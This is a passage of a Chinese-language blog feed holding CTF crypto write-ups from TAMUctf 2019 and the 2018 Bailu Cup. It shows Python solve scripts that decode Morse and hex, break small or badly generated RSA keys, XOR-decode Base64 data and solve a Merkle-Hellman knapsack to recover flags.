di-di-di-dah-dah di-di-di-dah-dah di-dah-dah-dah-dah dah-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-di-di-dit di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit di-di-di-dah-dah dah-di-di-di-dit dah-di-dah-dit di-di-di-dah-dah di-dah-dah-dah-dah di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dah dah-di-di-dit di-di-dah-dah-dah dah-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dit di-di-di-dah-dah dah-dah-dah-dah-dah dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-dah-dah-di-dit di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-dah-dah di-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dah dah-dah-dah-dah-dit di-di-di-dah-dah di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-dit di-di-dah-dah-dah dah-dah-dah-dah-dah dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit di-dah di-di-di-di-dah dah-di-di-dit di-di-di-di-dit di-dah dah-dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit di-di-dah-dit dah-di-di-di-dit dah-di-dit dah-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dah di-di-di-di-dah di-di-di-di-dit di-di-di-dah-dah dah-di-di-di-dit dah-dah-dah-di-dit di-di-di-di-dah dah-di-dah-dit dah-di-di-di-dit dah-di-dit di-di-di-dah-dah dah-dah-dah-di-dit di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dah dah-di-di-di-dit dah-di-di-di-dit dit di-di-di-di-dit di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah dah-dah-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-dah di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dah dit dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah di-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-di-dit dah-dah-dah-di-dit di-di-dah-dah-dah dah-di-di-di-dit di-di-di-dah-dah dah-dah-dah-di-dit dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dah dah-dah-di-di-dit dah-di-di-di-dit dit di-di-dah-dah-dah di-dah-dah-dah-dah di-di-di-dah-dah di-dah-dah-dah-dah di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dit di-di-di-di-dah dah-dah-di-di-dit di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-di-di-dit di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-di-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dit di-di-dah-dah-dah dah-dah-di-di-dit di-dah di-di-di-di-dit dah-di-di-di-dit di-di-dah-dah-dah di-dah-dah-dah-dah dah-di-di-di-dit di-dah di-di-dah-dah-dah di-dah-dah-dah-dah dah-dah-di-di-dit dah-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-di-dit di-di-di-di-dah di-di-dah-dah-dah dah-di-di-di-dit di-dah dah-di-di-di-dit di-di-di-di-dah di-di-di-di-dah dit di-di-di-di-dah dah-dah-dah-dah-dit dah-dah-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-dah-dah di-di-di-di-dit dah-dah-di-di-dit dah-dah-di-di-dit di-di-dah-dah-dah di-di-di-dah-dah di-di-dah-dah-dah di-di-di-di-dah di-di-dah-dah-dah di-di-di-di-dit di-di-di-di-dit dah-di-di-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-di-dit di-di-di-di-dit di-di-di-di-dit di-dah di-di-di-di-dah di-di-dah-dit di-di-di-di-dit dah-dah-dah-dah-dit di-di-di-di-dit di-dah di-di-di-dah-dah di-di-dah-dah-dah dah-dah-di-di-dit di-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-di-di-dit di-di-di-di-dah di-di-di-dah-dah di-di-dah-dah-dah di-di-di-dah-dah di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-di-dah-dah dah-dah-di-di-dit di-di-dah-dah-dah dah-di-di-di-dit dah-dah-di-di-dit dah-dah-dah-di-dit di-di-di-di-dah dah-di-dah-dit di-di-di-di-dah dah-dah-dah-dah-dah di-di-di-di-dit dah-dah-di-di-dit di-di-di-di-dah di-di-dah-dit di-di-di-dah-dah dah-dah-di-di-dit di-di-di-dah-dah di-di-di-di-dah di-di-di-dah-dah di-dah-dah-dah-dah di-di-di-dah-dah dah-dah-dah-dah-dah di-di-di-di-dit di-dah-dah-dah-dah di-di-di-di-dah dah-dah-dah-dah-dit"</span></span><br><span class="line">cipher=cipher.replace(<span class="string">'-'</span>,<span class="string">''</span>).replace(<span class="string">'dit'</span>,<span class="string">'.'</span>).replace(<span class="string">'di'</span>,<span class="string">'.'</span>).replace(<span class="string">'dah'</span>,<span class="string">'-'</span>)</span><br><span class="line"><span class="keyword">print</span> morse(cipher)</span><br><span class="line"><span class="comment"># 0x57702a6c58744751386538716e6d4d59552a737646486b6a49742a5251264a705a766a6d2125254b446b6670235e4e39666b346455346c423372546f5430505a516d4351454b5942345a4d762a21466b386c25626a716c504d6649476d612525467a4720676967656d7b433169634b5f636c31434b2d7930755f683476335f6d3449317d20757634767a4b5a7434796f6d694453684c6d385145466e5574774a404e754f59665826387540476e213125547176305663527a56216a217675757038426a644e49714535772324255634555a4f595a327a37543235743726784c40574f373431305149</span></span><br><span class="line"><span class="comment"># use https://findneo.github.io/kt/tools.html#conv/ to convert hex to string</span></span><br><span class="line"><span class="comment"># gigem&#123;C1icK_cl1CK-y0u_h4v3_m4I1&#125;</span></span><br></pre></td></tr></table></figure><h2 id="RSAaaay"><a href="#RSAaaay" class="headerlink" title="RSAaaay"></a>RSAaaay</h2><blockquote><p>Hey, you’re a hacker, right? I think I am too, look at what I made!</p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (2531257, 43)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>My super secret message: <code>906851 991083 1780304 2380434 438490 356019 921472 822283 817856 556932 2102538 2501908 2211404 991083 1562919 38268</code></p><hr><p>Problem is, I don’t remember how to decrypt it… could you help me out?</p><p>Difficulty: easy</p></blockquote><p>solve.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">2531257</span></span><br><span class="line">e=<span class="number">43</span></span><br><span class="line">cc=[<span class="number">906851</span> ,<span class="number">991083</span> ,<span class="number">1780304</span> ,<span class="number">2380434</span> ,<span class="number">438490</span> ,<span class="number">356019</span> ,<span class="number">921472</span> ,<span class="number">822283</span> ,<span class="number">817856</span>, <span class="number">556932</span> ,<span class="number">2102538</span> ,<span class="number">2501908</span>, <span class="number">2211404</span> ,<span class="number">991083</span> ,<span class="number">1562919</span> ,<span class="number">38268</span>]</span><br><span class="line"></span><br><span class="line">p,q=<span class="number">509</span>,<span class="number">4973</span></span><br><span class="line"><span class="keyword">assert</span>(p*q==n)</span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"><span class="keyword">assert</span>(e*d%phi==<span class="number">1</span>)</span><br><span class="line">mm=<span class="string">''</span>.join([str(int(pow(c,d,n))) <span class="keyword">for</span> c <span class="keyword">in</span> cc])</span><br><span class="line"><span class="keyword">print</span> mm <span class="comment">#103105103101109123839711897103101958310512095701081211051101039584105103101114115125</span></span><br><span class="line"></span><br><span class="line">mm=[<span class="number">103</span>,<span class="number">105</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">123</span>,<span class="number">83</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">83</span>,<span class="number">105</span>,<span class="number">120</span>,<span class="number">95</span>,<span class="number">70</span>,<span class="number">108</span>,<span class="number">121</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">95</span>,<span class="number">84</span>,<span class="number">105</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">115</span>,<span class="number">125</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join([chr(m) <span class="keyword">for</span> m <span class="keyword">in</span> mm])</span><br><span class="line"><span class="comment"># gigem&#123;Savage_Six_Flying_Tigers&#125;</span></span><br></pre></td></tr></table></figure><h2 id="-1"><a href="#-1" class="headerlink" title=":)"></a>:)</h2><blockquote><p>Look at what I found! <code>XUBdTFdScw5XCVRGTglJXEpMSFpOQE5AVVxJBRpLT10aYBpIVwlbCVZATl1WTBpaTkBOQFVcSQdH</code></p><p>Difficulty: easy</p></blockquote><p>直接base64解码没有可打印字符。已知flag前几个字符为gigem{，尝试base64解码后内容和gigem逐字节异或得到<code>:):):</code> ，发现规律。</p><p>solve.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,itertools</span><br><span class="line">data=base64.b64decode(<span class="string">"XUBdTFdScw5XCVRGTglJXEpMSFpOQE5AVVxJBRpLT10aYBpIVwlbCVZATl1WTBpaTkBOQFVcSQdH"</span>)</span><br><span class="line">flag_format=<span class="string">"gigem&#123;"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(chr(ord(a)^ord(b))<span class="keyword">for</span> a,b <span class="keyword">in</span> zip(flag_format,data))</span><br><span class="line"><span class="comment"># :):):)</span></span><br><span class="line">print(<span class="string">''</span>.join(chr(ord(a)^ord(b)) <span class="keyword">for</span> a,b <span class="keyword">in</span> zip(data, itertools.cycle(<span class="string">':)'</span>))))</span><br><span class="line"><span class="comment"># gigem&#123;I'm not superstitious, but I am a little stitious.&#125;</span></span><br></pre></td></tr></table></figure><p>zip和itertools.cycle用法如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">zip(seq1 [, seq2 [...]]) -&gt; [(seq1[0], seq2[0] ...), (...)]</span><br><span class="line">param seq1</span><br><span class="line"></span><br><span class="line">Return a list of tuples, where each tuple contains the i-th element</span><br><span class="line"><span class="keyword">from</span> each of the argument sequences.  The returned list <span class="keyword">is</span> truncated</span><br><span class="line"><span class="keyword">in</span> length to the length of the shortest argument sequence.</span><br><span class="line"></span><br><span class="line">-------</span><br><span class="line"></span><br><span class="line">cycle(iterable) --&gt; cycle object</span><br><span class="line">param iterable</span><br><span class="line"></span><br><span class="line">Return elements <span class="keyword">from</span> the iterable until it <span class="keyword">is</span> exhausted.</span><br><span class="line">Then repeat the sequence indefinitely.</span><br></pre></td></tr></table></figure><p>另外有一个不错的 <a href="https://gchq.github.io/CyberChef/#recipe=Magic(3,true,false,&#39;&#39;" target="_blank" rel="noopener">工具</a>&amp;input=WFVCZFRGZFNjdzVYQ1ZSR1RnbEpYRXBNU0ZwT1FFNUFWVnhKQlJwTFQxMGFZQnBJVndsYkNWWkFUbDFXVEJwYVRrQk9RRlZjU1FkSA) 可以尝试检查数据可能的格式。</p><h2 id="Holey-Knapsack"><a href="#Holey-Knapsack" class="headerlink" title="Holey Knapsack"></a>Holey Knapsack</h2><blockquote><p>My knapsack has a hole in it</p><p>Cipher text: <code>11b90d6311b90ff90ce610c4123b10c40ce60dfa123610610ce60d450d000ce61061106110c4098515340d4512361534098509270e5d09850e58123610c9</code></p><p>Public key: <code>{99, 1235, 865, 990, 5, 1443, 895, 1477}</code></p><p>The flag is slightly off format.</p><p>Difficulty: medium</p></blockquote><p>是著名的和RSA同年发布的公钥加密系统 <a href="https://en.wikipedia.org/wiki/Merkle%E2%80%93Hellman_knapsack_cryptosystem" target="_blank" rel="noopener">Merkle-Hellman Public Key Cryptosystem</a>  ，是<a href="https://en.wikipedia.org/wiki/Knapsack_cryptosystems" target="_blank" rel="noopener">Knapsack cryptosystems</a> 之一，已被破解。 参见<a href="https://www.nevivur.net/writeups/2019/02/tamuctf-19/#holey-knapsack" target="_blank" rel="noopener">https://www.nevivur.net/writeups/2019/02/tamuctf-19/#holey-knapsack</a> 。</p><p><a href="https://www.nevivur.net/writeups/2019/02/tamuctf-19/holey-knapsack/solution.py" target="_blank" rel="noopener">解密脚本</a>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">pkey = [<span class="number">99</span>, <span class="number">1235</span>, <span class="number">865</span>, <span class="number">990</span>, <span class="number">5</span>, <span class="number">1443</span>, <span class="number">895</span>, <span class="number">1477</span>]</span><br><span class="line">ctext = <span class="string">'11b90d6311b90ff90ce610c4123b10c40ce60dfa123610610ce60d450d000ce61061106110c4098515340d4512361534098509270e5d09850e58123610c9'</span></span><br><span class="line"></span><br><span class="line">mapping = dict()</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    enc = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> c&amp;(<span class="number">1</span>&lt;&lt;i):</span><br><span class="line">            enc += pkey[i]</span><br><span class="line">    mapping[hex(enc)[<span class="number">2</span>:]] = chr(c)</span><br><span class="line"></span><br><span class="line">d = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> ctext:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d <span class="keyword">and</span> ctext[<span class="number">0</span>] == <span class="string">'0'</span>:</span><br><span class="line">        ctext = ctext[<span class="number">1</span>:]</span><br><span class="line">    d += ctext[<span class="number">0</span>]</span><br><span class="line">    ctext = ctext[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d <span class="keyword">in</span> mapping:</span><br><span class="line">        <span class="keyword">print</span> mapping[d],</span><br><span class="line">        d = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># g i g _ e m &#123; m e r k l e - h e l l m a n - k n a p s a c k &#125;</span></span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://ctftime.org/event/740/tasks/" target="_blank" rel="noopener">https://ctftime.org/event/740/tasks/</a> </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;Not-Another-SQLi-Challenge&quot;&gt;&lt;a href=&quot;#Not-Another-SQLi-Challe
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2018 柏鹭杯 writeup</title>
    <link href="https://findneo.github.io/181125-bailucup-writeup/"/>
    <id>https://findneo.github.io/181125-bailucup-writeup/</id>
    <published>2018-11-25T12:25:37.000Z</published>
    <updated>2019-01-25T23:21:37.216Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto1"><a href="#Crypto1" class="headerlink" title="Crypto1"></a>Crypto1</h3><h4 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_prime</span><span class="params">(n)</span>:</span></span><br><span class="line">    num = n + <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> isPrime(num):</span><br><span class="line">            <span class="keyword">return</span> num</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">p = random.randint(<span class="number">1</span>&lt;&lt;<span class="number">3071</span>,<span class="number">1</span>&lt;&lt;<span class="number">3072</span>)</span><br><span class="line">p = next_prime(p)</span><br><span class="line">q = next_prime(p*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">N = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = pow(bytes_to_long(flag),e,N)</span><br><span class="line"><span class="keyword">print</span> N<span class="comment">#247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159</span></span><br><span class="line"><span class="keyword">print</span> c<span class="comment">#152721025887735064764471379084548069204525956728140596238274397757947415316727016281416993518884790524343567541799262176820909148208728616947040227306302164641933331109468512979068186962047716308015535717796123080303496277784765187481185086876434873226524784636408104495312136956587251145463229424950634548624036265557622592089071331292811066840281494102799063634204855779210798330603868025111521826209601342683209160845433746624786171189961029265101816540639855230011618388675527443511618729301028631422873421421991470450059414988968787693753741941765791793672069240992955177930884210118700416564364129283739917229225845073750451244070534919112957275948312337882004219145847493047815403283126471638320784008475284616178697542301935170768573588093196019976675846311280356987370969400610196847990069257614148181804915868273001764028563852238142447411811579695265293746037324400494199877368049162903819737962946786971556872009326814914717430484711885484790156341127433550909206551293806568904858726942820132521566970376839336895645431303013575622422180179687172859250687080526393904583834607514619581478966664406178290247731116920836372943133394640322159512633671870473674514938423231596849301615200001553851411828993918474534316510609878376462094608058640335426907349648369552864820322464995077358198844334320833893207364879282292959161203675080110629771237503657412087961891443054530286088807186134851425688726147108076040204500951624929585070273336203814962656253259257806100191430918121713005141607192112560560371475173081441671613602480052062955279287813475764285469835557663176529059039540417149792518941598550609678298901186032272305421028365295602810159191055078633881059737011784127699357480578433240110432805495328517379885306237631225477566136721077348329866885731002878563684349453668924250445128775992616650275173644658245397235667490402628</span></span><br></pre></td></tr></table></figure><h4 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159</span></span><br><span class="line">c=<span class="number">152721025887735064764471379084548069204525956728140596238274397757947415316727016281416993518884790524343567541799262176820909148208728616947040227306302164641933331109468512979068186962047716308015535717796123080303496277784765187481185086876434873226524784636408104495312136956587251145463229424950634548624036265557622592089071331292811066840281494102799063634204855779210798330603868025111521826209601342683209160845433746624786171189961029265101816540639855230011618388675527443511618729301028631422873421421991470450059414988968787693753741941765791793672069240992955177930884210118700416564364129283739917229225845073750451244070534919112957275948312337882004219145847493047815403283126471638320784008475284616178697542301935170768573588093196019976675846311280356987370969400610196847990069257614148181804915868273001764028563852238142447411811579695265293746037324400494199877368049162903819737962946786971556872009326814914717430484711885484790156341127433550909206551293806568904858726942820132521566970376839336895645431303013575622422180179687172859250687080526393904583834607514619581478966664406178290247731116920836372943133394640322159512633671870473674514938423231596849301615200001553851411828993918474534316510609878376462094608058640335426907349648369552864820322464995077358198844334320833893207364879282292959161203675080110629771237503657412087961891443054530286088807186134851425688726147108076040204500951624929585070273336203814962656253259257806100191430918121713005141607192112560560371475173081441671613602480052062955279287813475764285469835557663176529059039540417149792518941598550609678298901186032272305421028365295602810159191055078633881059737011784127699357480578433240110432805495328517379885306237631225477566136721077348329866885731002878563684349453668924250445128775992616650275173644658245397235667490402628</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">k=gmpy2.iroot(n//<span class="number">10</span>+<span class="number">1</span>,<span class="number">2</span>)[<span class="number">0</span>]+<span class="number">1</span></span><br><span class="line">print(k)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xfffffff</span>):</span><br><span class="line">    f=k-i</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">10000</span>==<span class="number">0</span>:</span><br><span class="line">        print(i,end=<span class="string">" "</span>)</span><br><span class="line">    <span class="keyword">if</span> n%f==<span class="number">0</span>:</span><br><span class="line">        print(i,n)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p=f</span><br><span class="line">q=n//f</span><br><span class="line"><span class="keyword">assert</span>(p*q==n)</span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4971490805710648894784063900603982138103528416416093113682856149525895474391965093292856360186270533203485404384261736770807923420477678768335595268260058770929420214670794184479653642688593773001265441972139034999789321709099375988424776953616924996952770970955016095518058970453801153351600603001621188113472370286189729979231943525793160692844078376540082324198649179890017101800683049489232021392715915700831833371902425005874555370189042455321691195416425399507551235346773377429357933240695935997956969841660473107352934178051894901298644110556291216221039424250078546978571086275993790666829060240691673857284132895978717935677825502362997789971900863003499701755174512295162461514926135376073693593713246781021035797102243028802222257489266812730745381990847604727619717567202686948267842932198278066304365500430012440700948799107940169074390644763691400614036677335457180241108468029814414775113509028739480597728378</span></span><br><span class="line"><span class="comment"># 0 59 247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159</span></span><br><span class="line"><span class="comment"># b'ISEC&#123;simp13_crypt0&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="Crypto2"><a href="#Crypto2" class="headerlink" title="Crypto2"></a>Crypto2</h3><blockquote><p>基因会突变，BASE64与Caesar也变异<br>加密密文: AUikzgRpLWaVIEaeKrqkJiieLhhqvf6=<br>​    格式: ISEC{ }</p></blockquote><p>我好像不太懂╮(╯▽╰)╭</p><h3 id="Crypto3"><a href="#Crypto3" class="headerlink" title="Crypto3"></a>Crypto3</h3><h4 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RSA(<span class="number">829467319</span>, <span class="number">48357</span>)</span><br><span class="line"><span class="number">322517722</span>,<span class="number">575397051</span>,<span class="number">76525646</span>,<span class="number">768452152</span>,<span class="number">107590034</span>,<span class="number">710690594</span>,<span class="number">322517722</span>,<span class="number">174907762</span>,<span class="number">343945760</span>,<span class="number">763355610</span>,<span class="number">301647581</span>,<span class="number">349705569</span>,<span class="number">575397051</span>,<span class="number">76525646</span>,<span class="number">410109929</span>,<span class="number">322517722</span>,<span class="number">497916224</span>,<span class="number">228868281</span>,<span class="number">228868281</span>,<span class="number">741167939</span>,<span class="number">497916224</span>,<span class="number">450014050</span>,<span class="number">322517722</span>,<span class="number">322517722</span>,<span class="number">126657310</span>,<span class="number">349705569</span>,<span class="number">322517722</span>,<span class="number">707637171</span>,<span class="number">76525646</span>,<span class="number">527107437</span>,<span class="number">710690594</span>,<span class="number">685252839</span>,<span class="number">450014050</span>,<span 